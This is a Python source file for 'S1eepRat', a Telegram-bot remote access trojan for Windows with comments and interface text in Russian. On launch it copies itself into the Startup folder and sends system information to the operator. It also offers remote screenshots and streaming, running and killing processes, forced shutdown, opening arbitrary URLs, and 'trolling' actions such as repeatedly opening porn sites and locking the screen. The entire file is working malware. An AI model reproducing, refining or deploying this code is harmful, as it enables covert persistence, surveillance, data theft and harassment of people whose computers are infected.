import sys
import telebot
from telebot import types
import os
import pyautogui as pg
from pyautogui import *
import pyscreeze
import time as t
import subprocess
import random
import shutil
import webbrowser
import mouse
from urllib3.util import url

bot=telebot.TeleBot('TOKEN', parse_mode=None) #Токет для бота

id= #Ваш ID

desp=True

us=os.path.join(os.path.expanduser('~'), 'S1eepTeam')
pw=os.makedirs(us, exist_ok=True)

def run_cmd(command):
    try:
        result = subprocess.check_output(command, shell=True, text=True, encoding='cp866')  # cp866 для Windows CMD
        return result
    except subprocess.CalledProcessError as e:
        return f"Ошибка выполнения команды: {e}"

def st():
    try:
        bot.send_message(chat_id=id, text='Кто-то включил твою ратку')
        osnova=sys.executable
        stra=os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start menu', 'Programs', 'Startup')
        iot=os.path.join(stra, os.path.basename(osnova))
        shutil.copy2(osnova, iot)
        bot.send_message(chat_id=id, text='Ратка была добавлена в авто загрузку')
        r2dwa = random.randint(111111, 999999)
        output = run_cmd('systeminfo')
        with open(os.path.join(us, f'FileInfo{r2dwa}.txt'), 'w', encoding='utf8') as f:
            f.write(output)

        with open(os.path.join(us, f'FileInfo{r2dwa}.txt'), 'r', encoding='utf8') as we:
            bot.send_document(chat_id=id, document=we)

        t.sleep(1)

        os.remove(os.path.join(us, f'FileInfo{r2dwa}.txt'))
    except FileNotFoundError:
        bot.send_message(chat_id=id, text='Мы не смогли найти файл')
    except OSError:
        bot.send_message(chat_id=id, text='Мы не смогли добавить в startup либо он уже добавлен')

st()

@bot.message_handler(commands=['start'])
def start(message):
    mar=types.ReplyKeyboardMarkup(resize_keyboard=True)

    infolist=types.KeyboardButton('ПК')
    proc=types.KeyboardButton('Программы')
    troll=types.KeyboardButton('Троллинг')
    screenshow=types.KeyboardButton('Экран')
    keyw=types.KeyboardButton('Клавиатура')
    crew=types.KeyboardButton('Автор')

    mar.add(infolist,screenshow,proc,troll,keyw,crew)

    bot.send_message(chat_id=id, text='Добро пожаловать в S1eepRat!', reply_markup=mar)

num=''

@bot.message_handler(content_types=['text'])
def text(message):
    global userw
    global num
    global desp
    if message.text=='ПК':
        mar = types.ReplyKeyboardMarkup(resize_keyboard=True)

        infolist = types.KeyboardButton('Информация пк')
        tare=types.KeyboardButton(f'Диспетчер ({desp})')
        back=types.KeyboardButton('Назад')

        mar.add(infolist,tare, back)

        bot.send_message(chat_id=id, text='Вы в разделе ПК', reply_markup=mar)

    elif message.text=='Программы':
        mar = types.ReplyKeyboardMarkup(resize_keyboard=True)

        startproc=types.KeyboardButton('Запустить программу')
        stopproc=types.KeyboardButton('Закрыть программу')
        task = types.KeyboardButton('Лист процессов')
        dle=types.KeyboardButton('Удалить')
        back = types.KeyboardButton('Назад')

        mar.add(startproc,stopproc, task,dle, back)

        bot.send_message(chat_id=id, text='Вы в разделе Программы', reply_markup=mar)

    elif message.text=='Экран':
        mar = types.ReplyKeyboardMarkup(resize_keyboard=True)

        scree = types.KeyboardButton('Показать экран')
        scrrens = types.KeyboardButton('Показывать экран')
        mess=types.KeyboardButton('Сообщение')
        back = types.KeyboardButton('Назад')

        mar.add(scree,scrrens,mess, back)

        bot.send_message(chat_id=id, text='Вы в разделе Экран', reply_markup=mar)

    elif message.text=='Мышь':
        mou=types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)

        rb=types.KeyboardButton('RB')
        lb=types.KeyboardButton('LB')
        md=types.KeyboardButton('MB')
        mx10 = types.KeyboardButton('Мышь 10x')
        null3 = types.KeyboardButton(' ')
        mxm10=types.KeyboardButton('Мышь 10-x')
        null1 = types.KeyboardButton(' ')
        my10=types.KeyboardButton('Мышь 10y')
        null2 = types.KeyboardButton(' ')
        mym10=types.KeyboardButton('Мышь 10-y')
        null4 = types.KeyboardButton(' ')
        custom=types.KeyboardButton('Кастом')
        back=types.KeyboardButton('Назад')

        mou.add(lb,md,rb,null1,my10,null2,mxm10,custom,mx10,null3,mym10,null4,back)

        bot.send_message(chat_id=id, text='Вы открыли раздел Мышь', reply_markup=mou)

    elif message.text=='Назад':
        mar = types.ReplyKeyboardMarkup(resize_keyboard=True)

        infolist = types.KeyboardButton('ПК')
        proc = types.KeyboardButton('Программы')
        troll = types.KeyboardButton('Троллинг')
        screenshow = types.KeyboardButton('Экран')
        keyw = types.KeyboardButton('Клавиатура')
        crew = types.KeyboardButton('Автор')

        mar.add(infolist,screenshow,proc,troll,keyw,crew)

        bot.send_message(chat_id=id, text='Вы вернулись в меню S1eepRat', reply_markup=mar)
    elif message.text=='Лист процессов':
        ra1=random.randint(111111,999999)
        output = run_cmd('tasklist')
        with open(os.path.join(us, f'FileTaks{ra1}.txt'), 'w', encoding='utf8') as f:
            f.write(output)

        with open(os.path.join(us, f'FileTaks{ra1}.txt'), 'r', encoding='utf8') as we:
            bot.send_document(chat_id=id, document=we)

        t.sleep(0.1)

        os.remove(os.path.join(us, f'FileTaks{ra1}.txt'))
    elif message.text=='Закрыть программу':
        def kill(takli):
            killw=takli.text
            output = run_cmd(f'taskkill /IM {killw} /F')

            bot.send_message(chat_id=id, text=f'Программа {output} была закрыта')
        msg=bot.send_message(chat_id=id, text='Напишите название программы:')
        bot.register_next_step_handler(msg, kill)
    elif message.text=='Информация пк':
        r2 = random.randint(111111, 999999)
        output = run_cmd('systeminfo')
        with open(os.path.join(us, f'FileInfo{r2}.txt'), 'w', encoding='utf8') as f:
            f.write(output)

        with open(os.path.join(us, f'FileInfo{r2}.txt'), 'r', encoding='utf8') as we:
            bot.send_document(chat_id=id, document=we)

        t.sleep(0.1)

        os.remove(os.path.join(us, f'FileInfo{r2}.txt'))
    elif message.text=='Показать экран':
        r2 = random.randint(111111, 999999)
        screenw=pg.screenshot()
        screenw.save(os.path.join(us, f'Desktop{r2}.png'))
        bot.send_message(chat_id=id, text='Ожидание экрана, 3 секунды')
        bot.send_photo(chat_id=id, photo=screenw)

        t.sleep(0.1)

        os.remove(os.path.join(us, f'Desktop{r2}.png'))
    elif message.text=='Запустить программу':
        def procces(prog):
            procc=prog.text
            output = run_cmd(f'start {procc}')

            bot.send_message(chat_id=id, text=f'Программа {procc} запущена')
        msg=bot.send_message(chat_id=id, text='Напишите название программы:')
        bot.register_next_step_handler(msg, procces)
    elif message.text=='Троллинг':
        mar = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)

        alt = types.KeyboardButton('Alt+F4')
        webw = types.KeyboardButton('PornHub')
        dance = types.KeyboardButton('Танцы')
        linwk=types.KeyboardButton('Открыть любую ссылку')
        killpc=types.KeyboardButton('Выключить пк')
        back=types.KeyboardButton('Назад')

        mar.add(alt,killpc, webw, linwk, dance, back)

        bot.send_message(chat_id=id, text='Вы в разделе Троллинг', reply_markup=mar)
    elif message.text=='Сообщение':
        def otpw(ot):

            zapis = ot.text
            with open(os.path.join(us, 'Razgovor.txt'), 'a', encoding='utf-8') as f:
                f.write('\nS1eepTeam: ' + zapis + ' (После ответа не забудьте сохранить!)' + '\n\n')
            output = run_cmd(f'start {us}\\Razgovor.txt')
            bot.send_message(chat_id=id, text=f'Сообщение: {zapis}\n\nОтправлено и открыто.\nДля просмотра ответа напишите : Ответ')

        msg = bot.send_message(chat_id=id, text='Напишите сообщение:')
        bot.register_next_step_handler(msg, otpw)
    elif message.text == 'Ответ':
        with open(os.path.join(us, 'Razgovor.txt'), 'r', encoding='utf-8') as f:
            bot.send_document(chat_id=id, document=f)
        bot.send_message(chat_id=id, text='Вы решили посмотреть ответ')
    elif message.text=='Показывать экран':
        def pokaz(poka):
            num=int(poka.text)
            bot.send_message(chat_id=id, text=f'Делаю {num} снимков, ожидайте!')
            for i in range(0,num):
                r2 = random.randint(111111, 999999)
                shr=pg.screenshot()
                shr.save(os.path.join(us, f'Desktop{r2}.png'))
                bot.send_photo(chat_id=id, photo=shr)
                pg.sleep(0.1)
                os.remove(os.path.join(us, f'Desktop{r2}.png'))
                pg.sleep(0.5)
            bot.send_message(chat_id=id, text=f'Завершено, {num} снимков было выслано вам')
        msg=bot.send_message(chat_id=id, text='Напишите кол-во скриншотов')
        bot.register_next_step_handler(msg, pokaz)

    elif message.text=='Alt+F4':
        pg.hotkey('Alt', 'F4')
    elif message.text=='PornHub':
        webbrowser.open('https://m.rusoska3.net/')
        webbrowser.open('https://m.rusoska3.net/')
        webbrowser.open('https://m.rusoska3.net/')
        webbrowser.open('https://m.rusoska3.net/')
        webbrowser.open('https://m.rusoska3.net/')
        webbrowser.open('https://m.rusoska3.net/')
        webbrowser.open('https://m.rusoska3.net/')
    elif message.text=='Танцы':
        def game(mous):
            lol=int(mous.text)
            bot.send_message(chat_id=id, text='Мышка начала танцевать!')
            for i in range(0, lol):
                pg.hotkey('Alt', 'Tab')
                pg.sleep(0.3)
                pg.hotkey('Win', 'L')
        msg=bot.send_message(chat_id=id, text='Напишите количество повторение:')
        bot.register_next_step_handler(msg, game)
    elif message.text=='Открыть любую ссылку':
        def senli(li):
            url=li.text
            bot.send_message(chat_id=id, text=f'Сайт: {url}\n\nОткрыт')
            webbrowser.open_new_tab(url)
        msw=bot.send_message(chat_id=id, text='Впишите ссылку:')
        bot.register_next_step_handler(msw, senli)
    elif message.text=='Выключить пк':
        bot.send_message(chat_id=id, text='Пожелаем ему удачи! (ПК был выключен)')
        run_cmd('shutdown /s /t 0')
    elif message.text=='Автор':
        bot.send_message(chat_id=id, text='Автор: @S1eepTeam\nХелпер\Тестер: @P1Bas0')

bot.infinity_polling()
